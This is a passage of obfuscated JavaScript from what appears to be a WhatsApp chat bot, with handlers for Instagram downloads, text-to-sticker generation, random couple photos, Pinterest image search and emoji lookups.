_0x593f96(0x318,0x16,0x63d,0x2bb):case _0x593f96(0x669,0x39e,0x1d6,0xb0c):case _0x1e23e4(0x7c6,0xad5,0x894,0xb70):case'instatv':if(!isUrl(args[0x1693+0x14a9+-0x2*0x159e])&&!args[0x2214+0x1645+0x5*-0xb45][_0x593f96(0x942,0xb4d,0x73a,0x4f7)]('instagram.'+'com'))return reply(lang[_0x593f96(0x995,0x5be,0x703,0x8d3)]());let urlnya=q;hx[_0x1e23e4(0x39c,0x467,0x65c,0x71a)](urlnya)[_0x1e23e4(0x693,0x489,0x667,0x7b8)](async _0x2ba186=>{function _0x171419(_0x48b1a9,_0x5ad48a,_0x1aba21,_0x328f35){return _0x1e23e4(_0x48b1a9-0x179,_0x5ad48a-0x1cd,_0x328f35- -0x36b,_0x5ad48a);}const _0x1f88fe={'wZadK':function(_0x484697,_0x4a1c0e){return _0x484697(_0x4a1c0e);},'OhSaZ':_0x25996a(0x653,0x370,0x4bf,0x258)};function _0x25996a(_0x4700cc,_0x1c0b01,_0xdce4fc,_0x568bec){return _0x593f96(_0x568bec- -0x4e2,_0x1c0b01,_0xdce4fc-0x19f,_0x568bec-0x68);}let _0x148c0f=await _0x1f88fe[_0x25996a(0x4bb,0x3fb,0xad9,0x762)](getBuffer,_0x2ba186[_0x171419(0x272,0x78e,0x90,0x591)][_0x25996a(0x38b,0x115,0x3ed,0x276)+_0x25996a(0x5ce,0x2e7,0x971,0x50b)]);await alpha['sendMessag'+'e'](from,_0x148c0f,image,{'thumbnail':_0x148c0f,'quoted':mek,'caption':'「\x20*INSTAGR'+'AM\x20DOWNLOA'+_0x171419(0x4ad,0x362,-0x34a,0x14f)+enter+enter+'🆔\x20*ID\x20:*\x20'+_0x2ba186['user']['id']+enter+(_0x171419(-0x177,0x26a,-0x589,-0x1c9)+'e\x20:*\x20')+_0x2ba186[_0x25996a(0x5a9,0x250,0x992,0x5f8)][_0x25996a(0xf1,0x7f2,0x7ca,0x42a)]+enter+('💋\x20*Fullnam'+'e\x20:*\x20')+_0x2ba186[_0x25996a(0x62c,0x601,0xabf,0x5f8)]['fullName']+enter+(_0x25996a(-0x96,0x37e,0x104,0x22)+'rs\x20:*\x20')+_0x2ba186[_0x25996a(0xacf,0x308,0x1d9,0x5f8)][_0x171419(0x72a,0x234,0xb60,0x6a4)]+enter+(_0x171419(-0x338,-0x340,-0x402,-0x1b3)+_0x25996a(0x14d,0x67c,0x5b0,0x668))+_0x2ba186['user'][_0x171419(0xa0e,0xade,0x54d,0x78d)]+enter+(_0x25996a(0xc0f,0x7ec,0x7ab,0x775)+'\x20https://i'+_0x171419(-0x3f,0x21c,0x197,0x25d)+_0x25996a(-0x2ec,-0xb1,-0x462,-0x96))+_0x2ba186[_0x171419(0x48f,0x577,0x1a2,0x591)][_0x171419(0x680,0x5b5,0x742,0x3c3)]+enter+(_0x25996a(0x18e,-0x18d,-0x37a,0xb1)+'*\x20')+_0x2ba186['medias'][_0x25996a(0x569,0x474,0x831,0x606)]+_0x25996a(0x30a,0x625,0xb01,0x641)+enter+enter+(_0x25996a(0x3a4,0x397,0x18e,0x61e)+_0x171419(0x438,0x90,-0x201,-0x19)+_0x171419(-0x1f7,-0x169,-0x600,-0x252)+_0x171419(0x2e5,0x782,0x6f8,0x472)+'_')});for(let _0x2e0466 of _0x2ba186['medias']){if(_0x2e0466['url'][_0x171419(0x52b,0x853,0x43b,0x3f9)](_0x1f88fe[_0x25996a(-0x52a,-0x4b9,-0x315,-0x1a3)])){let _0x4bf566=await _0x1f88fe[_0x171419(0x217,0x3c2,0x964,0x6fb)](getBuffer,_0x2e0466['url']);alpha['sendMessag'+'e'](from,_0x4bf566,video,{'thumbnail':Buffer[_0x171419(0xa56,0x83c,0x665,0x5cd)](-0x1a*0x8e+0x18*0xef+-0x124*0x7),'quoted':mek,'caption':_0x171419(0xa67,0x76d,0x754,0x634)+_0x25996a(0x5bc,0x63a,0x77c,0x510)+_0x2e0466[_0x171419(0x377,0x7e9,0x909,0x635)]});}else{let _0x540318=await _0x1f88fe[_0x171419(0x6cd,0x93f,0x75a,0x6fb)](getBuffer,_0x2e0466[_0x171419(-0x59e,-0x568,-0x32,-0x218)]);alpha[_0x25996a(0x2d6,0x196,-0x11c,0x381)+'e'](from,_0x540318,image,{'thumbnail':Buffer[_0x171419(0x9a8,0x587,0x515,0x5cd)](0x1*-0x13bd+-0x1b8c+0x2f49),'quoted':mek,'caption':_0x171419(0x430,0x2c4,0x211,0x634)+'•\x20'+_0x2e0466[_0x171419(0x3f4,0x31b,0x2f5,0x635)]});}}})[_0x593f96(0xc8c,0xc5c,0x8af,0x970)](_0xeac1af=>reply(_0x1e23e4(-0x74,0x1f3,0x29a,0x338)+_0x593f96(0x9c4,0x5ac,0x65b,0x811)+_0x1e23e4(0x160,0x423,0x1fa,0x4e6)+_0x593f96(0xa31,0xaa9,0x611,0xa53)+'te')),await limitAdd(sender,limit);break;case'ttp1':if(args[_0x593f96(0xae8,0xdea,0xb3b,0xbe7)]<0x19db*0x1+-0x135*0x15+-0x81)return reply(lang['noteks'](prefix,command));hhh=q,p=await getBuffer(_0x1e23e4(0xbd7,0x684,0x6d6,0x663)+_0x1e23e4(0x5f5,0x67a,0x7d5,0xc70)+_0x593f96(0x774,0xa28,0x794,0x6c5)+_0x1e23e4(0x4e9,0x938,0x710,0x7ba)+_0x1e23e4(0x7f7,0x975,0x95f,0xca4)+_0x1e23e4(0x812,0x4dd,0x2f7,0x2aa)+hhh+('&color=blu'+'e&apikey=h'+_0x1e23e4(0x27a,0x93e,0x62f,0x633)));const _0x352642={};_0x352642[_0x593f96(0x991,0xd8c,0x58b,0xa43)]=fgclink,alpha[_0x593f96(0x863,0x4e2,0xb95,0x6e4)+'e'](from,p,sticker,_0x352642);break;case _0x593f96(0x365,0x786,0x32b,-0x10d):if(args[_0x1e23e4(0x7be,0xa9e,0x90a,0xde0)]<-0x770+-0x1*-0x18cf+0x1a*-0xab)return reply(lang['noteks'](prefix,command));hhh=q,pp=await getBuffer(_0x1e23e4(0xa47,0x604,0x6d6,0x22f)+_0x593f96(0x9b3,0x9fa,0xce1,0xb16)+_0x1e23e4(0x61e,0x47e,0x596,0xa1a)+_0x593f96(0x8ee,0xd16,0x7b3,0x8ed)+_0x1e23e4(0x54d,0xde7,0x95f,0x750)+'?text='+hhh+(_0x593f96(0x574,0x69e,0x571,0x81d)+_0x593f96(0x92a,0x504,0x68e,0xa32)+'=hardianto'));const _0x1e8d19={};_0x1e8d19[_0x593f96(0x991,0xca1,0xdd6,0xc8d)]=fgclink,alpha[_0x1e23e4(0xb9a,0x54a,0x685,0x34e)+'e'](from,pp,sticker,_0x1e8d19);break;case'ttp3':if(args[_0x593f96(0xae8,0xbf3,0xd77,0xdeb)]<0x2330+0x25*-0x76+-0x11*0x111)return reply(lang[_0x1e23e4(0x270,0x16d,0x35b,0x60)](prefix,command));hhh=q,ppp=await getBuffer('https://ha'+_0x593f96(0x9b3,0xd39,0xba3,0x713)+_0x593f96(0x774,0x880,0xb5b,0x94f)+_0x593f96(0x8ee,0x498,0xb03,0x9e8)+_0x593f96(0xb3d,0xac3,0xee7,0x947)+'?text='+hhh+(_0x593f96(0x82b,0x40d,0xb41,0xbae)+_0x1e23e4(0x664,0x29,0x3f1,0x7f9)+_0x593f96(0x5bc,0xb7,0x31b,0x81f)));const _0x4dc665={};_0x4dc665['quoted']=fgclink,alpha[_0x1e23e4(0x622,0x5c2,0x685,0xb1a)+'e'](from,ppp,sticker,_0x4dc665);break;case _0x593f96(0x62c,0x2db,0x849,0x3f1):if(args[_0x593f96(0xae8,0xbd8,0xe74,0x6ee)]<0x1*-0x1849+-0x1260+-0x1*-0x2aaa)return reply(lang[_0x1e23e4(0x845,0x778,0x35b,0x7ab)](prefix,command));hhh=q,pppp=await getBuffer('https://ha'+_0x593f96(0x9b3,0xb35,0x7fa,0x84f)+_0x593f96(0x774,0x5c1,0x2d9,0x979)+_0x1e23e4(0x598,0x8c6,0x710,0xa76)+_0x593f96(0xb3d,0xd53,0xf84,0x65b)+_0x1e23e4(0x2f,0x7ff,0x2f7,0x803)+hhh+(_0x1e23e4(0x315,0x27a,0x670,0x370)+_0x593f96(0x2d9,0x2ed,0x729,0x46c)+_0x593f96(0x80d,0xcd3,0xbe4,0xa05)));const _0x278c60={};_0x278c60[_0x593f96(0x991,0x6ff,0xd2f,0xd1a)]=fgclink,alpha[_0x1e23e4(0x337,0x908,0x685,0x5ed)+'e'](from,pppp,sticker,_0x278c60);break;case _0x593f96(0xc56,0xe8f,0xd33,0xaab):case'couple':if(!isGroup)return reply(lang[_0x1e23e4(0x629,0x1bf,0x27f,0x45c)]());var datax=fs['readFileSy'+'nc']('./lib/coup'+_0x1e23e4(-0x18b,0x435,0x1f2,0x8d));jsonData=JSON[_0x1e23e4(0xa9b,0x87f,0x5e7,0x111)](datax),randIndex=Math[_0x1e23e4(0x7c,0x429,0x290,0x5f)](Math[_0x1e23e4(0x146,0x61e,0x57d,0x85a)]()*jsonData[_0x1e23e4(0x52f,0x750,0x90a,0xda0)]);let randKey_=jsonData[randIndex];Laki=await getBuffer(randKey_['male']),await alpha['sendMessag'+'e'](from,Laki,image,{'caption':_0x593f96(0x69b,0x5c8,0x433,0x758),'quoted':mek,'thumbnail':Buffer[_0x593f96(0xb16,0xe66,0x72f,0x836)](-0x9f7+0x43*0x7f+-0xba3*0x2)}),Cewe=await getBuffer(randKey_[_0x1e23e4(0x1fb,0x34e,0x3f2,0xbd)]);const mediaxox=await alpha[_0x593f96(0x95f,0x5cb,0xd66,0xb8f)+_0x1e23e4(0x9ec,0xc5d,0xa7d,0xc80)](from,Cewe,MessageType[_0x1e23e4(0x675,0x48,0x33e,0x5e7)],{'thumbnail':Buffer[_0x1e23e4(0x428,0x7c5,0x938,0xa88)](0x19ad+-0x9f*-0x13+-0x257a)});let bacotluxxo=mediaxox[_0x593f96(0xb85,0xa96,0x996,0x9d5)]['ephemeralM'+_0x593f96(0xb1f,0xa76,0xb43,0xa35)]?mediaxox[_0x593f96(0xb85,0x837,0x9a3,0xffc)]['ephemeralM'+_0x593f96(0xb1f,0x605,0xf4f,0x782)]:mediaxox;const _0x40c912={};_0x40c912[_0x1e23e4(0x479,0x621,0x1de,0x71)+'t']=_0x593f96(0x37b,0xad,0x5ca,0x3ec);const _0x3230d3={};_0x3230d3['buttonId']=_0x593f96(0x457,0x905,0x920,-0x2a),_0x3230d3[_0x593f96(0x2a4,0x1ba,0xcf,0x714)]=_0x40c912,_0x3230d3[_0x593f96(0xb7e,0x958,0x8a0,0xcb6)]=0x1;const _0x191017={};_0x191017[_0x1e23e4(-0x11b,0x265,0x1de,0x581)+'t']='Next\x20➡️';const _0x42dd0b={};_0x42dd0b[_0x1e23e4(0x448,0x1c9,0x200,-0x17)]=''+command,_0x42dd0b[_0x593f96(0x2a4,-0x10e,-0x69,-0xa3)]=_0x191017,_0x42dd0b[_0x593f96(0xb7e,0xa43,0xf52,0xd65)]=0x1;const buttonsxox=[_0x3230d3,_0x42dd0b],btnxo___={'contentText':_0x1e23e4(0x891,0xebd,0xada,0x5da),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x593f96(0x500,0x3b4,0x1ba,0x4a3))+sender[_0x593f96(0x311,0x7dd,0x39d,-0x1d0)]('@')[-0x1*0x10bd+0x4e+0x106f],'buttons':buttonsxox,'headerType':0x4,'imageMessage':bacotluxxo[_0x1e23e4(0x587,0x7de,0x9a7,0xc59)][_0x593f96(0x82c,0x8f4,0xcc3,0xcb7)+'ge']},_0x52690b={};_0x52690b[_0x593f96(0x991,0x77d,0x922,0x85b)]=mek,alpha[_0x593f96(0x863,0xc81,0x52a,0x426)+'e'](from,btnxo___,MessageType[_0x593f96(0x4e9,0x3be,0x4c7,0x8d7)+_0x593f96(0xc5b,0xcf2,0xaa1,0xda4)],_0x52690b)[_0x593f96(0xc8c,0xf88,0x9f8,0x812)](_0x52c594=>{const _0x668f60={'NqxTD':function(_0x1008f2,_0xe7eb5d){return _0x1008f2(_0xe7eb5d);},'dQhpI':_0x40c82b(0xadf,0x256,0x587,0x742)+_0x40c82b(0x531,0x205,0x41,0x4f3)+_0x39ede0(-0x120,-0x11c,0x16f,-0xcf)+_0x39ede0(0xb5f,0x6ba,0x80b,0x434)+'gi'};function _0x39ede0(_0x3f89ae,_0x108b9b,_0xf3b2ec,_0x5e50ac){return _0x593f96(_0x108b9b- -0x4d4,_0xf3b2ec,_0xf3b2ec-0x193,_0x5e50ac-0x23);}function _0x40c82b(_0x21977a,_0x4b2a00,_0x411a68,_0x2ba488){return _0x1e23e4(_0x21977a-0x83,_0x4b2a00-0xc5,_0x2ba488-0x1bd,_0x411a68);}_0x668f60[_0x39ede0(0x3a3,0x385,0x22a,-0x174)](reply,_0x668f60[_0x39ede0(0x7d5,0x66a,0x7b6,0x5c4)]);}),await limitAdd(sender,limit);break;case'pinterest':case _0x1e23e4(0x2ba,0x96c,0x4d3,0x37f):if(!q)return reply(_0x1e23e4(0x86,0x68b,0x3ea,0x8ba)+_0x593f96(0x5b1,0x344,0x109,0x915));async function pinterestSearch(_0xb8a0fc){function _0x4e56ef(_0x1414d2,_0x138612,_0x2d75b3,_0x391a5a){return _0x1e23e4(_0x1414d2-0x123,_0x138612-0x80,_0x2d75b3-0x261,_0x1414d2);}const _0x3d7b1d={'cwBIE':_0x4e56ef(0xb32,0xb4e,0x7b9,0xca8)+_0x4e56ef(0x2ed,0x5cf,0x6d4,0x36e),'VllcG':_0x2bdce8(0x532,0x9af,0xe5a,0xd60),'bBxDW':_0x4e56ef(0x84e,0x821,0xc7a,0x81b),'lokAN':_0x2bdce8(0x856,0x498,0x14,-0x57)+'21','OskIw':function(_0x5a1c21,_0x14878a){return _0x5a1c21===_0x14878a;},'HPUZD':_0x2bdce8(0x1ae,0x461,0x54f,0x6e1),'cmKxa':_0x2bdce8(0x79a,0xa4e,0x557,0xb3c),'oVqgH':function(_0x5b6c05,_0x57e17a){return _0x5b6c05*_0x57e17a;},'qyRFy':function(_0x533199,_0x1af8e6){return _0x533199(_0x1af8e6);},'mWxpj':function(_0x363c99,_0x5ca0fa,_0x350b2f){return _0x363c99(_0x5ca0fa,_0x350b2f);},'foEPl':'applicatio'+_0x4e56ef(0x484,0x532,0x8d4,0xa36)+_0x2bdce8(0x17c,0x4b6,0x93a,0x34d)+_0x2bdce8(0x64f,0x5bf,0x730,0x615)+'q=0.01','xzUPK':_0x4e56ef(0x649,0x990,0xa66,0xdd9)+_0x2bdce8(-0x8b,0x287,0x2c4,-0x1d),'bnfsn':_0x4e56ef(0x59b,-0x124,0x337,0x70e),'xFYkR':'empty','HlODR':'cors','dPjoZ':_0x4e56ef(0x9b9,0xafb,0x83e,0x6a1)+'n','Qckho':_0x4e56ef(0xd5,0x8f6,0x5e0,0xaaf)+'uest','wUvBd':'https://ww'+_0x2bdce8(0xa8c,0x784,0x4b4,0x3fa)+_0x4e56ef(0xb41,0xc00,0xa88,0x63c),'VgkCO':_0x2bdce8(0x361,0x661,0x8e3,0x765),'KKzmh':_0x2bdce8(0x4b9,0x5f8,0x443,0x3d4)};function _0x2bdce8(_0x204645,_0x5550d5,_0x3272d9,_0x17767a){return _0x593f96(_0x5550d5- -0x65,_0x3272d9,_0x3272d9-0x1df,_0x17767a-0xf7);}return new Promise((_0x294b6a,_0x15e49d)=>{function _0x50a0b1(_0x1d0eaf,_0x45fcbf,_0x41c0fe,_0x44e5ae){return _0x4e56ef(_0x44e5ae,_0x45fcbf-0x21,_0x1d0eaf- -0x3d,_0x44e5ae-0x126);}const _0x15af0c={'TaLsk':_0x3d7b1d[_0x1239bc(0x913,0x565,0xe2d,0x5b1)],'orfLc':_0x3d7b1d[_0x1239bc(0xa9d,0x59d,0xbb6,0x66b)],'bjPYQ':_0x50a0b1(0xb61,0xe20,0xaa1,0x8b0),'iFYSU':_0x3d7b1d[_0x1239bc(0x318,-0x7b,0x78d,-0x2f)],'HXaFJ':_0x3d7b1d[_0x50a0b1(0x981,0xe1f,0xcb5,0xac9)],'bRKDa':function(_0x4adaa5,_0x17b4ea){function _0x520b36(_0x30f756,_0x3c99d0,_0x1ec194,_0x179c1c){return _0x50a0b1(_0x1ec194-0x12a,_0x3c99d0-0x168,_0x1ec194-0x165,_0x3c99d0);}return _0x3d7b1d[_0x520b36(0xf3d,0xea7,0xbc8,0x872)](_0x4adaa5,_0x17b4ea);},'tydER':_0x3d7b1d[_0x1239bc(0x449,0x801,0x6f8,0x24f)],'vbDrW':_0x3d7b1d[_0x50a0b1(0x8d3,0x403,0xcb2,0x632)],'iXAmy':function(_0x532f6c,_0x4516f8){function _0x51ad45(_0x1e2357,_0x1c2231,_0x5aae6e,_0x4e50cd){return _0x50a0b1(_0x1c2231-0x151,_0x1c2231-0x1f2,_0x5aae6e-0x27,_0x1e2357);}return _0x3d7b1d[_0x51ad45(0x947,0x6ae,0x2e3,0x336)](_0x532f6c,_0x4516f8);},'IyAHv':function(_0x514df2,_0x490a5d){return _0x3d7b1d['qyRFy'](_0x514df2,_0x490a5d);}};function _0x1239bc(_0x29c193,_0x2db2c1,_0x18ce1a,_0x1725ab){return _0x4e56ef(_0x18ce1a,_0x2db2c1-0x90,_0x29c193- -0x27e,_0x1725ab-0x6c);}_0x3d7b1d['mWxpj'](fetch,_0x50a0b1(0xa20,0x770,0x803,0xab2)+_0x50a0b1(0x82f,0x37d,0xb8d,0x75f)+_0x1239bc(0x9e9,0x67c,0x8de,0x6d3)+_0x50a0b1(0x3c9,-0x72,0x5e0,0x857)+_0x1239bc(0x2d4,0x69f,-0x48,0x657)+_0x1239bc(0x3e1,-0x96,0x5f,0x102)+_0x50a0b1(0x778,0x383,0x4dd,0x599)+_0x50a0b1(0x5a9,0x77e,0x77d,0x662)+_0x1239bc(0x7a7,0x9e1,0x41a,0x58f)+'3Fq%3D'+_0xb8a0fc+('&data=%7B%'+_0x1239bc(0xa6f,0xe4e,0xa47,0x85c)+'22%3A%7B%2'+'2isPrefetc'+_0x1239bc(0x997,0x694,0x9bf,0x769)+'se%2C%22qu'+_0x1239bc(0x874,0x3f8,0x5d3,0xc6b)+'22')+_0xb8a0fc+(_0x1239bc(0x3f9,0x159,-0x57,0x4a1)+_0x1239bc(0x3ee,0x353,-0xc2,0x4fe)+_0x1239bc(0x71f,0xa9c,0x88c,0x7b5)+_0x1239bc(0xa8b,0x868,0x771,0xf4f)+'etch_conte'+'xt_on_reso'+_0x1239bc(0x2e7,0x6b3,0x24e,0x3f3)+_0x1239bc(0x34a,0x319,-0x192,0xd6)+'C%22contex'+_0x1239bc(0x682,0x63c,0xaa8,0x7aa)+_0x1239bc(0x7ce,0x529,0x8ff,0xa10)+_0x1239bc(0x5bb,0x42d,0x67b,0x748)+'59'),{'headers':{'accept':_0x3d7b1d['foEPl'],'accept-language':_0x3d7b1d[_0x1239bc(0x83d,0xbb1,0xbfa,0xb69)],'cache-control':_0x3d7b1d[_0x50a0b1(0x9e1,0xbe3,0xefa,0xa70)],'pragma':_0x3d7b1d[_0x50a0b1(0x9e1,0xa77,0xae6,0xe53)],'sec-fetch-dest':_0x3d7b1d['xFYkR'],'sec-fetch-mode':_0x3d7b1d[_0x1239bc(0x611,0x55b,0x481,0x2ff)],'sec-fetch-site':_0x3d7b1d['dPjoZ'],'sec-gpc':'1','x-app-version':_0x50a0b1(0x43c,0x455,0x369,0x4ee),'x-pinterest-appstate':'active','x-requested-with':_0x3d7b1d['Qckho']},'referrer':_0x3d7b1d['wUvBd'],'referrerPolicy':_0x3d7b1d['VgkCO'],'body':null,'method':_0x3d7b1d[_0x50a0b1(0x7d2,0x336,0x4eb,0x81c)],'mode':_0x1239bc(0x18d,0x122,0x2f3,0x534)})[_0x50a0b1(0x88b,0xcdc,0x911,0x7f2)](_0x2f46b5=>_0x2f46b5[_0x50a0b1(0x94a,0x61f,0x519,0x9d2)]())[_0x50a0b1(0x88b,0x3fc,0x553,0xca2)](_0x5e8f6f=>{function _0x526efa(_0x5072d1,_0x341c58,_0x23ca7a,_0x4d31f8){return _0x1239bc(_0x5072d1-0x67,_0x341c58-0xe2,_0x341c58,_0x4d31f8-0xdf);}function _0x4432bc(_0x3d5135,_0x1a97bb,_0x50095e,_0x2b002a){return _0x50a0b1(_0x50095e- -0x154,_0x1a97bb-0x24,_0x50095e-0x146,_0x3d5135);}if(_0x15af0c[_0x4432bc(0x5ec,0x7,0x350,0x4a2)](_0x15af0c[_0x526efa(0xb0b,0xb5d,0xfbf,0xe45)],_0x15af0c[_0x4432bc(0x9fb,0x6fa,0x4e0,0x1)])){var _0x1a95cc=_0x526efa(0xb3f,0xb60,0x854,0xd10)+_0x4ca089[_0x4432bc(0x108,0x355,0x203,0x4d2)]('@')[-0x3*-0xa99+-0xa99+-0x1532]+(_0x526efa(0x79e,0xa75,0xadd,0x4a5)+_0x4432bc(0xa15,0x5f8,0x53f,0x372)+'e\x20nomor\x20aj'+_0x4432bc(0x6e3,0x201,0x572,0x515)+_0x4432bc(0x6a,0x2de,0x4d5,0xa5));const _0x5e427a={};_0x5e427a[_0x526efa(0x24a,0x42d,0x80,0x5ce)]=_0x15af0c['TaLsk'],_0x5e427a[_0x526efa(0x110,-0x2dc,-0x196,0xbb)]={},_0x5e427a['type']=0x1,_0x5e427a[_0x526efa(0x110,-0x2dc,-0x196,0xbb)][_0x4432bc(0xee,0x1c3,0x2ae,0x730)+'t']=_0x15af0c[_0x526efa(0xa8a,0x9e6,0x895,0x58a)];const _0x268001={};_0x268001['buttonId']=_0x15af0c['bjPYQ'],_0x268001[_0x526efa(0x110,0x540,-0xf,0x2c)]={},_0x268001[_0x4432bc(0x88d,0xb63,0xa70,0xf13)]=0x1,_0x268001[_0x526efa(0x110,0x540,-0xf,0x2c)][_0x526efa(0x228,0x5af,0x3d5,0x411)+'t']=_0x15af0c[_0x4432bc(0x7fe,0x9cf,0x753,0x378)];const _0x1411e6=[_0x5e427a,_0x268001],_0x201b4d={};_0x201b4d[_0x526efa(0x321,0x168,0x45c,0x49c)+'t']=_0x1a95cc,_0x201b4d['footerText']=''+_0x3f2224+_0x3ced1e+_0x3f88ae+_0x4fdd16+'©\x20'+_0x35e1e0,_0x201b4d['buttons']=_0x1411e6,_0x201b4d[_0x526efa(0x7e4,0x87a,0xa36,0xa6c)]=0x1;const _0x488c57=_0x201b4d,_0x425e57={};_0x425e57[_0x526efa(0xab4,0xc47,0xbe1,0xe43)]='hi',_0x425e57[_0x526efa(0x87a,0xb46,0x7a1,0xbfe)+_0x4432bc(0x559,0x852,0x6d8,0x8fc)]=0x3b9aca00,_0x425e57[_0x4432bc(0xe31,0x787,0xb7f,0xa46)+'d']=!![],_0x425e57['sendEpheme'+_0x526efa(0x22e,0x471,-0x141,0x2e9)]=!![],_0x425e57[_0x4432bc(-0xb9,0x24e,0x19f,-0x164)+'id']=[_0x222f6c];const _0x570d2c={};_0x570d2c[_0x526efa(0x446,0x79a,0x4f,0x4bd)]=_0x15af0c[_0x4432bc(0x879,0xd83,0xad8,0xdbc)],_0x570d2c[_0x4432bc(0xd02,0x7c0,0x996,0x9f0)+'o']=_0x425e57,_0x570d2c[_0x4432bc(0x6f0,0x9e1,0x883,0x915)]=_0x23afb2,_0x570d2c['sendEpheme'+_0x526efa(0x22e,-0x60,0x6df,0x22a)]=!![],_0xab8e70['sendMessag'+'e'](_0xb0f924,_0x488c57,_0x3534d1[_0x526efa(0x355,0x73f,0x123,0x100)+_0x4432bc(0x72a,0x998,0xb4d,0xcaa)],_0x570d2c);}else{const _0x10da73=_0x5e8f6f[_0x4432bc(0xea8,0x943,0xaf1,0xea5)+_0x526efa(0x502,0x146,0x332,0x383)][_0x526efa(0x794,0xb2a,0x2ef,0x5eb)][_0x526efa(0x671,0xa91,0x159,0x3c1)][Math[_0x526efa(0x2da,0xe9,-0x228,0x42e)](_0x15af0c['iXAmy'](Math[_0x4432bc(0x38a,0x2ab,0x64d,0x83a)](),_0x5e8f6f['resource_r'+_0x526efa(0x502,0x3dd,0x6e9,0x9aa)]['data'][_0x4432bc(0x4d2,0x422,0x6f7,0x9dc)][_0x4432bc(0xd54,0xafa,0x9da,0x7ae)]))];var _0x12fa8d=[];const _0x3e2604={};_0x3e2604[_0x526efa(0x13d,0x121,0x145,0x14a)]=_0x10da73['images'][_0x526efa(0x983,0xb4c,0x713,0x9aa)][_0x526efa(0x19d,-0x32f,0x256,0x107)],_0x12fa8d['push'](_0x3e2604),_0x15af0c[_0x526efa(0xa98,0xb38,0x894,0x762)](_0x294b6a,_0x12fa8d);}})[_0x50a0b1(0xcd2,0xb86,0xeb8,0xf37)](_0x15e49d);});}const pinterest=_0x3d437d=>new Promise((_0x32b9a1,_0x5969de)=>{const _0x23f549={'FuVEh':function(_0x45bf63,_0x381c6f){return _0x45bf63(_0x381c6f);}};function _0x55eca6(_0x3a104f,_0x209006,_0x381760,_0x473e9a){return _0x1e23e4(_0x3a104f-0xe,_0x209006-0x84,_0x381760- -0x4b,_0x209006);}function _0x2482e1(_0x557d38,_0x440f19,_0x4cc401,_0x49d509){return _0x593f96(_0x4cc401- -0x2af,_0x440f19,_0x4cc401-0x71,_0x49d509-0x17c);}_0x23f549['FuVEh'](pinterestSearch,_0x3d437d)[_0x2482e1(0x9bf,0x99f,0x596,0x393)](_0x362ee3=>{const _0x4f6dc3={};_0x4f6dc3[_0x19be55(0x57d,0x229,0x739,0x6e2)]=0xc8;function _0x19be55(_0x565d3c,_0x8d5893,_0x1f3377,_0x4d3c0b){return _0x2482e1(_0x565d3c-0x107,_0x4d3c0b,_0x1f3377-0x190,_0x4d3c0b-0x1af);}function _0x4dae30(_0xaedfe,_0x12709c,_0x51628f,_0x25162c){return _0x2482e1(_0xaedfe-0x14,_0x51628f,_0x25162c-0x1c8,_0x25162c-0x174);}_0x4f6dc3['image']=_0x362ee3[0x1595+0x1337*-0x2+0x10d9*0x1][_0x19be55(0x20b,0x2ea,0x1b2,0x3a5)],_0x23f549[_0x4dae30(0x64a,0xd42,0x68a,0x86c)](_0x32b9a1,_0x4f6dc3);})[_0x55eca6(0x81c,0xf5f,0xa63,0x69e)](_0x5969de);});pinterest(q)[_0x1e23e4(0x213,0x56f,0x667,0x388)](async _0x4f60b3=>{function _0x3f3231(_0x29ad84,_0x20ff2d,_0x123f2f,_0x2808e0){return _0x1e23e4(_0x29ad84-0xb,_0x20ff2d-0xc1,_0x29ad84- -0x14f,_0x20ff2d);}const _0x109af4={'hbqkZ':function(_0x532870,_0x540525){return _0x532870(_0x540525);}};let _0x3e4493=await _0x109af4[_0x557c96(0x5c9,0x4e3,0x27c,-0x20d)](getBuffer,_0x4f60b3[_0x557c96(-0x1d1,-0x3e2,0x128,0x3a7)]);function _0x557c96(_0xf2f66c,_0x3bf90f,_0x21417d,_0x2f9a43){return _0x1e23e4(_0xf2f66c-0xf4,_0x3bf90f-0x1e,_0x21417d- -0x216,_0xf2f66c);}alpha[_0x3f3231(0x536,0x4f1,0x71b,0x4bb)+'e'](from,_0x3e4493,MessageType[_0x3f3231(0x1ef,0x596,0x5e6,0x599)],{'caption':_0x557c96(0x3af,0x38d,0x57b,0x613)+'arian:\x20'+q,'quoted':mek,'thumbnail':Buffer[_0x3f3231(0x7e9,0xa50,0xc52,0x6d5)](0x5a*0x47+-0x2b2*-0xb+-0x369c)});})['catch'](async _0x542530=>{function _0x32518a(_0x5e8977,_0x4c53ca,_0x3a9b70,_0x2f6417){return _0x1e23e4(_0x5e8977-0x108,_0x4c53ca-0xa7,_0x2f6417- -0x221,_0x4c53ca);}function _0x40ba9c(_0x5b2864,_0x28e99e,_0x5ba49b,_0x725b97){return _0x1e23e4(_0x5b2864-0x1,_0x28e99e-0x197,_0x5ba49b-0x2a5,_0x5b2864);}const _0x472216={'mbPCI':function(_0x5d7f2c,_0x2f2499){return _0x5d7f2c(_0x2f2499);},'isYyy':_0x32518a(0x5a2,0x5aa,-0x90,0x364)+'salahan'};_0x472216[_0x32518a(0x501,-0x69,0x5f9,0x42a)](reply,_0x472216[_0x32518a(0x7bf,0x925,0x969,0x68c)]);}),await limitAdd(sender,limit);break;case _0x593f96(0x599,0xa60,0x781,0x465):case _0x593f96(0x597,0x2a7,0x544,0x7ab):if(!q)return reply('emojinya?');qes=args[_0x1e23e4(0x8c8,0x8c9,0xa51,0xd52)]('\x20');const _0x6a99c2={};_0x6a99c2[_0x1e23e4(0x586,0xa1a,0x77a,0x668)]=_0x1e23e4(0xaa2,0xb66,0xa12,0xc62)+'e-'+qes,_0x6a99c2[_0x593f96(0x3f1,0x38d,-0xea,0x69e)+'n']=''+creator,_0x6a99c2[_0x1e23e4(0xec7,0xf12,0xa6e,0x95b)]=''+qes;const _0x451c67={};_0x451c67['title']=_0x593f96(0x9fe,0x897,0x92c,0xdb5)+_0x593f96(0x6ed,0x2d0,0x6ff,0xb91)+qes,_0x451c67['descriptio'+'n']=''+creator,_0x451c67[_0x593f96(0xc4c,0xfe4,0xceb,0x748)]=''+qes;const _0x560b1b={};_0x560b1b[_0x1e23e4(0x29d,0x911,0x77a,0x8c2)]='Emoji-Sams'+'ung-'+qes,_0x560b1b[_0x593f96(0x3f1,0x189,-0x14,0x44e)+'n']=''+creator,_0x560b1b[_0x1e23e4(0x81d,0x82d,0xa6e,0x6b4)]=''+qes;const 